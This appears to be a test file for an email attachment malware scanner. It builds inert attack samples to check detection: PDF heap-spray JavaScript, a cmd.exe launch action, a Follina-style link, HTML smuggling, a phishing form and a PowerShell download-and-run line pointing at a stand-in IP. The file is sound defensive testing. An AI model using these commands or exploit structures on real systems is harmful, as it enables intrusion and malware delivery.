import { createHash } from "node:crypto";
import { crc32, deflateRawSync, deflateSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { zipOf } from "@aegis/test-fixtures";
import { parseMail } from "@aegis/mail-parser";
import { analyzeMessage, codeSignals, inspectFile, type AttachmentInput, type SemanticClassifier, type SemanticInput } from "./index";

// Every sample here is inert: it has the structure of an attack, with no working payload.
const pdf = (...objs: (string | Buffer)[]) => Buffer.concat([Buffer.from("%PDF-1.7\n"), ...objs.map(o => (typeof o === "string" ? Buffer.from(o + "\n", "latin1") : Buffer.concat([o, Buffer.from("\n")]))), Buffer.from("%%EOF\n")]);
const flateObj = (n: number, body: string, dict = "") => {
  const z = deflateSync(Buffer.from(body, "latin1"));
  return Buffer.concat([Buffer.from(`${n} 0 obj\n<< /Length ${z.length} /Filter /FlateDecode ${dict}>>\nstream\n`, "latin1"), z, Buffer.from("\nendstream\nendobj", "latin1")]);
};
const att = (filename: string, content: Buffer, contentType = "application/octet-stream"): AttachmentInput => ({ filename, contentType, size: content.length, sha256: createHash("sha256").update(content).digest("hex"), content });
const codes = (r: { evidence: { code: string }[] }) => r.evidence.map(e => e.code);

/** A ZIP with deflated entries, like the ones Office writes. */
function deflatedZip(entries: { name: string; content: string }[]): Buffer {
  const locals: Buffer[] = [], central: Buffer[] = [];
  let offset = 0;
  for (const e of entries) {
    const raw = Buffer.from(e.content), data = deflateRawSync(raw), name = Buffer.from(e.name);
    const l = Buffer.alloc(30);
    l.writeUInt32LE(0x04034b50, 0); l.writeUInt16LE(20, 4); l.writeUInt16LE(8, 8); l.writeUInt32LE(crc32(raw), 14);
    l.writeUInt32LE(data.length, 18); l.writeUInt32LE(raw.length, 22); l.writeUInt16LE(name.length, 26);
    locals.push(l, name, data);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(20, 6); c.writeUInt16LE(8, 10); c.writeUInt32LE(crc32(raw), 16);
    c.writeUInt32LE(data.length, 20); c.writeUInt32LE(raw.length, 24); c.writeUInt16LE(name.length, 28); c.writeUInt32LE(offset, 42);
    central.push(c, name);
    offset += 30 + name.length + data.length;
  }
  const cd = Buffer.concat(central), eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10); eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, eocd]);
}

async function mailWith(a: AttachmentInput) {
  const raw = `From: Billing <billing@vendor-example.com>\r\nTo: me@example.com\r\nSubject: Invoice\r\nMessage-ID: <x@vendor-example.com>\r\nDate: Thu, 05 Nov 2026 10:00:00 +0000\r\nContent-Type: text/plain\r\n\r\nPlease find the invoice attached.\r\n`;
  return parseMail(Buffer.from(raw));
}

describe("PDF inspection", () => {
  it("finds exploit JavaScript inside a compressed stream the /JS entry points to", () => {
    const js = `var s = unescape("%u9090%u9090%u4141%u4141%u4242%u4242%u4343%u4343%u4444"); while (s.length < 0x40000) s += s; util.printf("%45000f", 1);`;
    const r = inspectFile("invoice.pdf", "application/pdf", pdf("1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj", "2 0 obj\n<< /S /JavaScript /JS 5 0 R >>\nendobj", flateObj(5, js)));
    expect(codes(r)).toContain("PDF_EXPLOIT_CODE");
    expect(r.evidence.find(e => e.code === "PDF_EXPLOIT_CODE")?.hardFloor).toBe(true);
    expect(r.brief?.signals).toEqual(expect.arrayContaining(["PDF_JAVASCRIPT", "PDF_AUTO_ACTION", "CODE_SHELLCODE", "CODE_HEAP_SPRAY", "CODE_VULNERABLE_API"]));
    expect(r.brief?.code.join(" ")).toContain("util.printf");
  });

  it("sees through hex-escaped names", () => {
    const r = inspectFile("a.pdf", "application/pdf", pdf("1 0 obj\n<< /Type /Catalog /Open#41ction << /S /J#61va#53cript /JS (app.alert\\(1\\)) >> >>\nendobj"));
    expect(codes(r)).toEqual(expect.arrayContaining(["PDF_JAVASCRIPT", "PDF_OBFUSCATED"]));
    expect(r.evidence.find(e => e.code === "PDF_JAVASCRIPT")?.weight).toBeGreaterThan(2);
    expect(r.brief?.code[0]).toContain("app.alert(1)");
  });

  it("reads dictionaries packed into an object stream", () => {
    const r = inspectFile("a.pdf", "application/pdf", pdf(flateObj(7, `8 0 << /S /Launch /F (cmd.exe) /Win << /F (cmd.exe) /P (/c calc) >> >>`, "/Type /ObjStm /N 1 /First 4 ")));
    expect(codes(r)).toContain("PDF_LAUNCH");
  });

  it("flags a program hidden inside the PDF", () => {
    const r = inspectFile("a.pdf", "application/pdf", pdf("1 0 obj\n<< /Names << /EmbeddedFiles << /Names [(x) 2 0 R] >> >> >>\nendobj", "2 0 obj\n<< /Type /Filespec /F (payroll.exe) /UF (payroll.exe) /EF << /F 3 0 R >> >>\nendobj"));
    expect(codes(r)).toContain("PDF_EMBEDDED_EXECUTABLE");
  });

  it("collects links for the URL checks", async () => {
    const r = inspectFile("a.pdf", "application/pdf", pdf("1 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /URI /URI (http://198.51.100.7/login) >> >>\nendobj"));
    expect(r.brief?.urls).toEqual(["http://198.51.100.7/login"]);
    const a = att("statement.pdf", pdf("1 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /URI /URI (http://198.51.100.7/login) >> >>\nendobj"), "application/pdf");
    const res = await analyzeMessage(await mailWith(a), [a]);
    expect(res.evidence.some(e => e.source === "url")).toBe(true);
  });

  it("leaves an ordinary PDF alone", () => {
    const r = inspectFile("menu.pdf", "application/pdf", pdf("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj", flateObj(3, "BT /F1 12 Tf 72 712 Td (Lunch menu) Tj ET")));
    expect(r.evidence).toEqual([]);
  });

  it("stays fast on a file built to waste time", () => {
    const t0 = Date.now();
    inspectFile("a.pdf", "application/pdf", Buffer.from("%PDF-1.7\n" + "1 0 obj\nstream\n".repeat(20_000) + "/J#41 ".repeat(50_000)));
    inspectFile("a.html", "text/html", Buffer.from("<script>".repeat(50_000) + "A".repeat(2_000_000)));
    expect(Date.now() - t0).toBeLessThan(3000);
  });
});

describe("Office, RTF, web and script inspection", () => {
  const ct = `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>`;
  it("flags a remote template and a Follina-style link", () => {
    const rels = `<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://203.0.113.9/t.dotm" TargetMode="External"/></Relationships>`;
    expect(codes(inspectFile("cv.docx", "", deflatedZip([{ name: "[Content_Types].xml", content: ct }, { name: "word/_rels/settings.xml.rels", content: rels }])))).toContain("OFFICE_REMOTE_TEMPLATE");
    const follina = `<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:https://203.0.113.9/x.html!x-usc:https://203.0.113.9/x.html" TargetMode="External"/></Relationships>`;
    const r = inspectFile("cv.docx", "", deflatedZip([{ name: "[Content_Types].xml", content: ct }, { name: "word/_rels/document.xml.rels", content: follina }]));
    expect(r.evidence.find(e => e.code === "OFFICE_PROTOCOL_EXPLOIT")?.hardFloor).toBe(true);
  });

  it("flags macros in a file type that shouldn't have them", () => {
    expect(codes(inspectFile("report.docx", "", zipOf([{ name: "[Content_Types].xml", content: ct }, { name: "word/vbaProject.bin", content: "x" }])))).toContain("OFFICE_HIDDEN_MACROS");
    expect(codes(inspectFile("report.docx", "", zipOf([{ name: "[Content_Types].xml", content: ct }, { name: "word/document.xml", content: "<w:document/>" }])))).toEqual([]);
  });

  it("flags an Equation Editor object in RTF", () => {
    expect(codes(inspectFile("order.rtf", "application/rtf", Buffer.from("{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata 0105000002000000}}}")))).toContain("RTF_EXPLOIT");
  });

  it("flags a sign-in page sent as an attachment, and HTML smuggling", () => {
    const page = `<html><body><form action="https://203.0.113.9/p.php" method="post"><input name="u"><input type="password" name="p"></form></body></html>`;
    const r = inspectFile("Secure_Message.html", "text/html", Buffer.from(page));
    expect(codes(r)).toContain("WEB_CREDENTIAL_FORM");
    expect(r.brief?.urls).toContain("https://203.0.113.9/p.php");
    const smuggle = `<script>var b = new Blob([atob(d)], {type: "application/octet-stream"}); var a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = "invoice.iso"; a.click();</script>`;
    expect(inspectFile("view.html", "text/html", Buffer.from(smuggle)).evidence.find(e => e.code === "WEB_SMUGGLING")?.hardFloor).toBe(true);
  });

  it("flags an SVG that carries a script", () => {
    expect(codes(inspectFile("logo.svg", "image/svg+xml", Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg"><script>window.location="https://203.0.113.9/"</script></svg>`)))).toContain("SVG_SCRIPT");
  });

  it("reads what a script does", () => {
    const r = inspectFile("update.ps1", "", Buffer.from(`IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a'); Start-Process $env:TEMP\\a.exe`));
    expect(codes(r)).toContain("SCRIPT_DOWNLOAD_AND_RUN");
    expect(codeSignals("console.log('hello')")).toEqual([]);
  });
});

describe("AI review of attachments", () => {
  it("passes decoded structure, not document text, to the AI step, and bounds its weight", async () => {
    let seen: SemanticInput | undefined;
    const semantic: SemanticClassifier = { id: "fake", classify: async m => { seen = m; return { evidence: [{ code: "LLM_ATTACHMENT_THREAT", weight: 9, category: "malware", source: "llm", explanation: "AI review: exploit." }] }; } };
    const a = att("invoice.pdf", pdf("1 0 obj\n<< /OpenAction << /S /JavaScript /JS (this.getAnnots\\(\\)) >> >>\nendobj", flateObj(2, "BT (Confidential salary list) Tj ET")), "application/pdf");
    const res = await analyzeMessage(await mailWith(a), [a], { semantic });
    expect(seen?.attachments?.[0]).toMatchObject({ filename: "invoice.pdf", kind: "pdf" });
    expect(seen?.attachments?.[0]?.code.join(" ")).toContain("getAnnots");
    expect(JSON.stringify(seen?.attachments)).not.toContain("salary");
    const llm = res.evidence.find(e => e.code === "LLM_ATTACHMENT_THREAT");
    expect(llm?.weight).toBe(4);
    expect(llm?.hardFloor).toBe(false);
  });
});
